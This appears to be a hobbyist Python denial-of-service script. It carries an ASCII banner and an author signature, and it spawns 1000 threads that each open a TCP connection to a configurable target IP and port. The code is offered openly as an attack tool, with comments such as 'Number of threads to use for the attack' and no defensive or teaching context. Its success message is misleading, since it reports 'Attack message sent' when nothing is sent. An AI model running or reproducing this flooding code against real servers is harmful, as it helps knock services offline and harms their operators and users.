import socket
import threading

def print_banner():
    banner = """
  _____             _    _____ _           _   
 / ____|           | |  / ____| |         | |  
| (___  _ __   __ _| | | (___ | |__   ___ | |_ 
 \___ \| '_ \ / _` | |  \___ \| '_ \ / _ \| __|
 ____) | | | | (_| | |  ____) | | | | (_) | |_ 
|_____/|_| |_|\__,_|_| |_____/|_| |_|\___/ \__|
                                              
"""
    print(banner)

print_banner()

#_____________________________#

# SCRIPT BY SAMGHOST909 🇧🇷💀
# KIBA NÃO CUZAO🤨👍🏼
#_____________________________#

TARGET_ADDRESS = '0.0.0.0'  # Replace with the IP address of the target server
TARGET_PORT = 8080  # Replace with the port of the target server
NUM_THREADS = 1000  # Number of threads to use for the attack

def ddos_attack():
    try:
        target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_socket.connect((TARGET_ADDRESS, TARGET_PORT))
        target_socket.close()
        print("[+] Attack message sent to the server.")
    except Exception as e:
        print("[!] Error:", e)

def start_attack():
    threads = []
    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=ddos_attack)
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    start_attack()
        
